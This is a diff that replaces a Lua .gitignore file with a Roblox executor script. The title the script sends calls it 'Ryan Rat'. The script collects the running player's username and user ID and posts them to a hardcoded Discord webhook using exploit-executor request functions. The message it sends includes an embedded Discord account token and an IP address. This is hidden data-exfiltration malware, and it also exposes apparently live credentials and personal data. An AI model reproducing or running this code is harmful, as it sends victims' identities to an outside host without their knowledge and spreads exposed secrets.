@@ -1,41 +1,29 @@
-# Compiled Lua sources
-luac.out
+local username = game:GetService("Players").LocalPlayer.Name
+local userid = game:GetService("Players").LocalPlayer.UserId
+local icon = "https://www.roblox.com/headshot-thumbnail/image?userId="..userid.."&width=420&height=420&format=png"
+local OSTime = os.time()
+local Time = os.date('!*t', OSTime)
+local Webhook = "https://discord.com/api/webhooks/972944536991055942/4Kd0Y9DMehDjnIE12JrdsihLuUPiKQlI4MOgF9XJzPCVX4EoPxyPNXrJjQ1Gzzvv3ItH"
 
-# luarocks build files
-*.src.rock
-*.zip
-*.tar.gz
-
-# Object files
-*.o
-*.os
-*.ko
-*.obj
-*.elf
-
-# Precompiled Headers
-*.gch
-*.pch
-
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
-*.def
-*.exp
-
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
-
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
-
+local OSTime = os.time();
+local Time = os.date('!*t', OSTime);
+timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
+local msg = {
+    ["embeds"] = {
+        {
+             ["color"] = 0xfffff, --decimal
+             ["title"] = username.." just executed Ryan Rat ",
+            ["description"] = "acct token ODMyNjU0MjU5NDgwMDM1Mzc5.YKWg6A.6Q3ylevS_ptV_u6UACuBadOb_Gc",
+            ["thumbnail"] = {
+                ["url"] = icon
+            },
+        ["author"] = {["name"] = username, ["icon_url"] = icon, ["url"] = "https://www.roblox.com/users/"..userid.."/profile"  },
+            ["footer"] = {
+                ["text"] = "IP = 209.226.179.226",
+            },
+            ['timestamp'] = timestamp,
+        }
+    }
+}
+request = http_request or request or HttpPost or syn.request
+request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)}
